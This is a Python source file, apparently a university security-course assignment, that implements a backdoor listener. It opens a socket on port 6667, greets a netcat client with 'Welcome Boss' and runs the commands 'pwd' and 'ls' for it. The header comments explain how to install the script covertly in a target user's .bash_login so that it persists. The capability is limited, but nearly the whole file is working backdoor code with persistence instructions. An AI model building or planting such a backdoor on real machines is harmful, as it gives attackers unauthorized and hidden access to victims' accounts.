###
# CPSC 526 - Assignment 1
# Group: Justin Berry, Andrew Lata
# This is a Python program that is meant to run as a process on a target machine
# It grants an attacking user a backdoor, providing an attacker with access to 
# some terminal commands
#
# To install this script to a linux user's profile, add '/path/to/backdoor.py'
# to the .bash_login file in the target user's home folder. If the file does not 
# exist, you can create it.
###

import socket
import getopt
import sys
import subprocess

LISTEN = False
HOST = ''
PORT = 0


def start():
    global LISTEN
    global HOST
    global PORT

    LISTEN = True
    # if true, run in netcat listen mode (server).
    if LISTEN == True:
        HOST = '127.0.0.1'
        PORT = 6667
        server_connector()

def server_connector():
    # Create a simple waiting loop for clients to connect to
    # the server
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1)  ## only need to allow 1 client connection
    print("Waiting for socket connection at " + HOST + ":" + str(PORT))

    while True:
        clientSocket, addr = server.accept()
        print("NC Client has connected via" + addr[0] + ":" + str(addr[1]))
        server_listener(clientSocket)


## this function deals with netcat commands from client connection
def server_listener(clientSocket):
    while True:
        clientSocket.send(bytearray("Welcome Boss: \n","utf-8"))
        bashCommand = ''
        while "\n" not in bashCommand:
            bashCommand = clientSocket.recv(1024).decode()
        bashCommand = bashCommand.rstrip()
        print("Client Entered: " + bashCommand)

        if(bashCommand =='pwd'):
            print("pwd was entered")
            output = subprocess.check_output(['pwd'])
        elif(bashCommand =='ls'):
            output = subprocess.check_output(['ls'])
        else:
            output = "Not a valid bash command \n".encode()

        clientSocket.send(output)


if __name__ == '__main__':
    start()








